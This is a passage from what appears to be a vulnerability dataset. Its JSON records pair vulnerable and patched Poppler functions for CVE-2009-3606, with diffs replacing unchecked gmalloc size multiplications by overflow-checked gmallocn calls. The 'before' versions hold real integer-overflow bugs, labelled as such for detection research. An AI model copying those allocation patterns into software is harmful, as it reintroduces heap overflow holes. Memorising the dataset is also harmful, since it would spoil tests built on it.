}\n  } else {\n    goto err1;\n  }\n\n  // Construct a lookup table -- this stores pre-computed decoded\n  // values for each component, i.e., the result of applying the\n  // decode mapping to each possible image pixel component value.\n  //\n  // Optimization: for Indexed and Separation color spaces (which have\n  // only one component), we store color values in the lookup table\n  // rather than component values.\n  colorSpace2 = NULL;\n  nComps2 = 0;\n  if (colorSpace->getMode() == csIndexed) {\n    // Note that indexHigh may not be the same as maxPixel --\n    // Distiller will remove unused palette entries, resulting in\n    // indexHigh < maxPixel.\n    indexedCS = (GfxIndexedColorSpace *)colorSpace;\n    colorSpace2 = indexedCS->getBase();\n    indexHigh = indexedCS->getIndexHigh();\n    nComps2 = colorSpace2->getNComps();\n    lookup2 = indexedCS->getLookup();\n    colorSpace2->getDefaultRanges(x, y, indexHigh);\n    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps2);\n    for (k = 0; k < nComps2; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tj = (int)(decodeLow[0] + (i * decodeRange[0]) / maxPixel + 0.5);\n\tif (j < 0) {\n\t  j = 0;\n\t} else if (j > indexHigh) {\n\t  j = indexHigh;\n\t}\n\n\tmapped = x[k] + (lookup2[j*nComps2 + k] / 255.0) * y[k];\n\tlookup[k][i] = dblToCol(mapped);\n\tbyte_lookup[i * nComps2 + k] = (Guchar) (mapped * 255);\n      }\n    }\n  } else if (colorSpace->getMode() == csSeparation) {\n    sepCS = (GfxSeparationColorSpace *)colorSpace;\n    colorSpace2 = sepCS->getAlt();\n    nComps2 = colorSpace2->getNComps();\n    sepFunc = sepCS->getFunc();\n    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps2);\n    for (k = 0; k < nComps2; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tx[0] = decodeLow[0] + (i * decodeRange[0]) / maxPixel;\n\tsepFunc->transform(x, y);\n\tlookup[k][i] = dblToCol(y[k]);\n\tbyte_lookup[i*nComps2 + k] = (Guchar) (y[k] * 255);\n      }\n    }\n  } else {\n    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps);\n    for (k = 0; k < nComps; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tmapped = decodeLow[k] + (i * decodeRange[k]) / maxPixel;\n\tlookup[k][i] = dblToCol(mapped);\n\tbyte = (int) (mapped * 255.0 + 0.5);\n\tif (byte < 0)  \n\t  byte = 0;  \n\telse if (byte > 255)  \n\t  byte = 255;  \n\tbyte_lookup[i * nComps + k] = byte;\t\n      }\n    }\n  }\n\n  return;\n\n err2:\n  obj.free();\n err1:\n  ok = gFalse;\n  byte_lookup = NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -75,7 +75,7 @@\n     nComps2 = colorSpace2->getNComps();\n     lookup2 = indexedCS->getLookup();\n     colorSpace2->getDefaultRanges(x, y, indexHigh);\n-    byte_lookup = (Guchar *)gmalloc ((maxPixel + 1) * nComps2);\n+    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps2);\n     for (k = 0; k < nComps2; ++k) {\n       lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n \t\t\t\t\t   sizeof(GfxColorComp));",
        "diff_line_info": {
            "deleted_lines": [
                "    byte_lookup = (Guchar *)gmalloc ((maxPixel + 1) * nComps2);"
            ],
            "added_lines": [
                "    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps2);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/GfxImageColorMap::getRGBLine",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void GfxImageColorMap::getRGBLine(Guchar *in, unsigned int *out, int length) {\n  int i, j;\n  Guchar *inp, *tmp_line;\n\n  switch (colorSpace->getMode()) {\n  case csIndexed:\n  case csSeparation:\n    tmp_line = (Guchar *) gmalloc (length * nComps2);\n    for (i = 0; i < length; i++) {\n      for (j = 0; j < nComps2; j++) {\n\ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];\n      }\n    }\n    colorSpace2->getRGBLine(tmp_line, out, length);\n    gfree (tmp_line);\n    break;\n\n  default:\n    inp = in;\n    for (j = 0; j < length; j++)\n      for (i = 0; i < nComps; i++) {\n\t*inp = byte_lookup[*inp * nComps + i];\n\tinp++;\n      }\n    colorSpace->getRGBLine(in, out, length);\n    break;\n  }\n\n}",
        "func": "void GfxImageColorMap::getRGBLine(Guchar *in, unsigned int *out, int length) {\n  int i, j;\n  Guchar *inp, *tmp_line;\n\n  switch (colorSpace->getMode()) {\n  case csIndexed:\n  case csSeparation:\n    tmp_line = (Guchar *) gmallocn (length, nComps2);\n    for (i = 0; i < length; i++) {\n      for (j = 0; j < nComps2; j++) {\n\ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];\n      }\n    }\n    colorSpace2->getRGBLine(tmp_line, out, length);\n    gfree (tmp_line);\n    break;\n\n  default:\n    inp = in;\n    for (j = 0; j < length; j++)\n      for (i = 0; i < nComps; i++) {\n\t*inp = byte_lookup[*inp * nComps + i];\n\tinp++;\n      }\n    colorSpace->getRGBLine(in, out, length);\n    break;\n  }\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n   switch (colorSpace->getMode()) {\n   case csIndexed:\n   case csSeparation:\n-    tmp_line = (Guchar *) gmalloc (length * nComps2);\n+    tmp_line = (Guchar *) gmallocn (length, nComps2);\n     for (i = 0; i < length; i++) {\n       for (j = 0; j < nComps2; j++) {\n \ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];",
        "diff_line_info": {
            "deleted_lines": [
                "    tmp_line = (Guchar *) gmalloc (length * nComps2);"
            ],
            "added_lines": [
                "    tmp_line = (Guchar *) gmallocn (length, nComps2);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/ArthurOutputDev::drawImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void ArthurOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  double *ctm;\n  QMatrix matrix;\n  int is_identity_transform;\n  \n  buffer = (unsigned char *)gmalloc (width * height * 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t  ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_ARGB32);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_RGB32);\n  }\n\n  if (m_image == NULL || m_image->isNull()) {\n    qDebug() << \"Null image\";\n    delete imgStr;\n    return;\n  }\n  ctm = state->getCTM();\n  matrix.setMatrix(ctm[0] / width, ctm[1] / width, -ctm[2] / height, -ctm[3] / height, ctm[2] + ctm[4], ctm[3] + ctm[5]);\n\n  m_painter->setMatrix(matrix, true);\n  m_painter->drawImage( QPoint(0,0), *m_image );\n  delete m_image;\n  m_image = 0;\n  free (buffer);\n  delete imgStr;\n\n}",
        "func": "void ArthurOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  double *ctm;\n  QMatrix matrix;\n  int is_identity_transform;\n  \n  buffer = (unsigned char *)gmallocn3(width, height, 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t  ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_ARGB32);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_RGB32);\n  }\n\n  if (m_image == NULL || m_image->isNull()) {\n    qDebug() << \"Null image\";\n    delete imgStr;\n    return;\n  }\n  ctm = state->getCTM();\n  matrix.setMatrix(ctm[0] / width, ctm[1] / width, -ctm[2] / height, -ctm[3] / height, ctm[2] + ctm[4], ctm[3] + ctm[5]);\n\n  m_painter->setMatrix(matrix, true);\n  m_painter->drawImage( QPoint(0,0), *m_image );\n  delete m_image;\n  m_image = 0;\n  free (buffer);\n  delete imgStr;\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n   QMatrix matrix;\n   int is_identity_transform;\n   \n-  buffer = (unsigned char *)gmalloc (width * height * 4);\n+  buffer = (unsigned char *)gmallocn3(width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,",
        "diff_line_info": {
            "deleted_lines": [
                "  buffer = (unsigned char *)gmalloc (width * height * 4);"
            ],
            "added_lines": [
                "  buffer = (unsigned char *)gmallocn3(width, height, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/CairoOutputDev::drawMaskedImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void CairoOutputDev::drawMaskedImage(GfxState *state, Object *ref,\n\t\t\t\tStream *str, int width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tStream *maskStr, int maskWidth,\n\t\t\t\tint maskHeight, GBool maskInvert)\n{\n  ImageStream *maskImgStr;\n  maskImgStr = new ImageStream(maskStr, maskWidth, 1, 1);\n  maskImgStr->reset();\n\n  int row_stride = (maskWidth + 3) & ~3;\n  unsigned char *maskBuffer;\n  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);\n  unsigned char *maskDest;\n  cairo_surface_t *maskImage;\n  cairo_pattern_t *maskPattern;\n  Guchar *pix;\n  int x, y;\n\n  int invert_bit;\n  \n  invert_bit = maskInvert ? 1 : 0;\n\n  for (y = 0; y < maskHeight; y++) {\n    pix = maskImgStr->getLine();\n    maskDest = maskBuffer + y * row_stride;\n    for (x = 0; x < maskWidth; x++) {\n      if (pix[x] ^ invert_bit)\n\t*maskDest++ = 0;\n      else\n\t*maskDest++ = 255;\n    }\n  }\n\n  maskImage = cairo_image_surface_create_for_data (maskBuffer, CAIRO_FORMAT_A8,\n\t\t\t\t\t\t maskWidth, maskHeight, row_stride);\n\n  delete maskImgStr;\n  maskStr->close();\n\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  ImageStream *imgStr;\n  cairo_matrix_t matrix;\n  int is_identity_transform;\n\n  buffer = (unsigned char *)gmalloc (width * height * 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  for (y = 0; y < height; y++) {\n    dest = (unsigned int *) (buffer + y * 4 * width);\n    pix = imgStr->getLine();\n    colorMap->getRGBLine (pix, dest, width);\n  }\n\n  image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n\n  if (image == NULL) {\n    delete imgStr;\n    return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  maskPattern = cairo_pattern_create_for_surface (maskImage);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawMaskedImage %dx%d\\n\", width, height));\n\n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  /* scale the mask to the size of the image unlike softMask */\n  cairo_pattern_set_matrix (pattern, &matrix);\n  cairo_pattern_set_matrix (maskPattern, &matrix);\n\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_mask (cairo, maskPattern);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_mask (cairo_shape, pattern);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy (maskPattern);\n  cairo_surface_destroy (maskImage);\n  cairo_pattern_destroy (pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  free (maskBuffer);\n  delete imgStr;\n}",
        "func": "void CairoOutputDev::drawMaskedImage(GfxState *state, Object *ref,\n\t\t\t\tStream *str, int width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tStream *maskStr, int maskWidth,\n\t\t\t\tint maskHeight, GBool maskInvert)\n{\n  ImageStream *maskImgStr;\n  maskImgStr = new ImageStream(maskStr, maskWidth, 1, 1);\n  maskImgStr->reset();\n\n  int row_stride = (maskWidth + 3) & ~3;\n  unsigned char *maskBuffer;\n  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);\n  unsigned char *maskDest;\n  cairo_surface_t *maskImage;\n  cairo_pattern_t *maskPattern;\n  Guchar *pix;\n  int x, y;\n\n  int invert_bit;\n  \n  invert_bit = maskInvert ? 1 : 0;\n\n  for (y = 0; y < maskHeight; y++) {\n    pix = maskImgStr->getLine();\n    maskDest = maskBuffer + y * row_stride;\n    for (x = 0; x < maskWidth; x++) {\n      if (pix[x] ^ invert_bit)\n\t*maskDest++ = 0;\n      else\n\t*maskDest++ = 255;\n    }\n  }\n\n  maskImage = cairo_image_surface_create_for_data (maskBuffer, CAIRO_FORMAT_A8,\n\t\t\t\t\t\t maskWidth, maskHeight, row_stride);\n\n  delete maskImgStr;\n  maskStr->close();\n\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  ImageStream *imgStr;\n  cairo_matrix_t matrix;\n  int is_identity_transform;\n\n  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  for (y = 0; y < height; y++) {\n    dest = (unsigned int *) (buffer + y * 4 * width);\n    pix = imgStr->getLine();\n    colorMap->getRGBLine (pix, dest, width);\n  }\n\n  image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n\n  if (image == NULL) {\n    delete imgStr;\n    return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  maskPattern = cairo_pattern_create_for_surface (maskImage);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawMaskedImage %dx%d\\n\", width, height));\n\n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  /* scale the mask to the size of the image unlike softMask */\n  cairo_pattern_set_matrix (pattern, &matrix);\n  cairo_pattern_set_matrix (maskPattern, &matrix);\n\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_mask (cairo, maskPattern);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_mask (cairo_shape, pattern);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy (maskPattern);\n  cairo_surface_destroy (maskImage);\n  cairo_pattern_destroy (pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  free (maskBuffer);\n  delete imgStr;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -10,7 +10,7 @@\n \n   int row_stride = (maskWidth + 3) & ~3;\n   unsigned char *maskBuffer;\n-  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);\n+  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);\n   unsigned char *maskDest;\n   cairo_surface_t *maskImage;\n   cairo_pattern_t *maskPattern;\n@@ -46,7 +46,7 @@\n   cairo_matrix_t matrix;\n   int is_identity_transform;\n \n-  buffer = (unsigned char *)gmalloc (width * height * 4);\n+  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,",
        "diff_line_info": {
            "deleted_lines": [
                "  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);",
                "  buffer = (unsigned char *)gmalloc (width * height * 4);"
            ],
            "added_lines": [
                "  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);",
                "  buffer = (unsigned char *)gmallocn3 (width, height, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/CairoOutputDev::beginString",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void CairoOutputDev::beginString(GfxState *state, GooString *s)\n{\n  int len = s->getLength();\n\n  if (needFontUpdate)\n    updateFont(state);\n\n  if (!currentFont)\n    return;\n\n  glyphs = (cairo_glyph_t *) gmalloc (len * sizeof (cairo_glyph_t));\n  glyphCount = 0;\n}",
        "func": "void CairoOutputDev::beginString(GfxState *state, GooString *s)\n{\n  int len = s->getLength();\n\n  if (needFontUpdate)\n    updateFont(state);\n\n  if (!currentFont)\n    return;\n\n  glyphs = (cairo_glyph_t *) gmallocn (len, sizeof (cairo_glyph_t));\n  glyphCount = 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,6 +8,6 @@\n   if (!currentFont)\n     return;\n \n-  glyphs = (cairo_glyph_t *) gmalloc (len * sizeof (cairo_glyph_t));\n+  glyphs = (cairo_glyph_t *) gmallocn (len, sizeof (cairo_glyph_t));\n   glyphCount = 0;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "  glyphs = (cairo_glyph_t *) gmalloc (len * sizeof (cairo_glyph_t));"
            ],
            "added_lines": [
                "  glyphs = (cairo_glyph_t *) gmallocn (len, sizeof (cairo_glyph_t));"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/CairoOutputDev::drawImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void CairoOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  cairo_matrix_t matrix;\n  int is_identity_transform;\n  \n  buffer = (unsigned char *)gmalloc (width * height * 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_ARGB32,\n\t\t\t\t\t\t width, height, width * 4);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n  }\n\n  if (image == NULL) {\n   delete imgStr;\n   return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawImageMask %dx%d\\n\", width, height));\n  \n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  cairo_pattern_set_matrix (pattern, &matrix);\n\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_paint (cairo);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_paint(cairo_shape);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy (pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  delete imgStr;\n}",
        "func": "void CairoOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  cairo_matrix_t matrix;\n  int is_identity_transform;\n  \n  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_ARGB32,\n\t\t\t\t\t\t width, height, width * 4);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n  }\n\n  if (image == NULL) {\n   delete imgStr;\n   return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawImageMask %dx%d\\n\", width, height));\n  \n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  cairo_pattern_set_matrix (pattern, &matrix);\n\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_paint (cairo);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_paint(cairo_shape);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy 